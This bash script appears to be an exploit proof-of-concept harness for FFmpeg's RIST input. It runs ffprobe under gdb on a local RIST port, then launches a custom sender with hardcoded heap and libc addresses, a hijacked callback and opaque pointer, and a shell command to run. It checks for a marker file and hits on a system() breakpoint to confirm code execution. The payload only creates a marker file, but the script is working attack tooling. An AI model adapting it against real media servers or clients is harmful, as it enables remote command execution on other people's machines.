#!/usr/bin/env bash
# W4 command case: NAME BINARY MARKER CMD LEN SENDER CB OPAQUE
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
LIB="$ROOT/prefix/lib"
name=${1:-cc}; bin=${2:-$ROOT/plain/src/ffprobe_g}
marker=${3:-/tmp/ffmpeg2shell-w4-marker}
cmd=${4:-'touch /tmp/ffmpeg2shell-w4-marker'}
len=${5:-9968}
sender=${6:-rist_sender_cmd}
cb=${7:-0x7ffff7a58750}
opaque=${8:-0x5555560d20d0}
prot=0x55555584f5a0; ring=0x5555558d1fe0; priv=0x5555560d2100
mkdir -p "$ROOT/evidence"
rm -f "$marker"
OUT="$ROOT/evidence/${name}.log"; SEND="$ROOT/evidence/${name}-send.log"
(env LD_LIBRARY_PATH="$LIB" MALLOC_MMAP_THRESHOLD_=16777216 \
    timeout 50 gdb -q -batch -x "$ROOT/cmd-control.cmd" \
    --args "$bin" -hide_banner -loglevel verbose -f data \
    -i async:rist://@:5004 -show_packets > "$OUT" 2>&1; \
    echo "gdb rc=$?" >> "$OUT") &
gdb_pid=$!
sleep 3
if [ "$sender" = rist_sender_cmd ]; then
    (env LD_LIBRARY_PATH="$LIB" timeout 35 "$ROOT/$sender" \
        'rist://127.0.0.1:5004' 2200 "$len" "$prot" "$ring" "$priv" "$cb" "$opaque" "$cmd" \
        > "$SEND" 2>&1; echo "sender rc=$?" >> "$SEND") &
else
    (env LD_LIBRARY_PATH="$LIB" timeout 35 "$ROOT/$sender" \
        'rist://127.0.0.1:5004' 2200 "$len" \
        > "$SEND" 2>&1; echo "sender rc=$?" >> "$SEND") &
fi
sender_pid=$!
wait $sender_pid $gdb_pid
if [ -e "$marker" ]; then effect=CREATED; else effect=absent; fi
printf '%-12s hits=%s system_bp=%s marker=%s | %s\n' "$name" \
    "$(grep -c 'CC FIRST HIT' "$OUT")" \
    "$(grep -c 'Breakpoint 3, system' "$OUT")" "$effect" \
    "$(tail -1 "$SEND")"
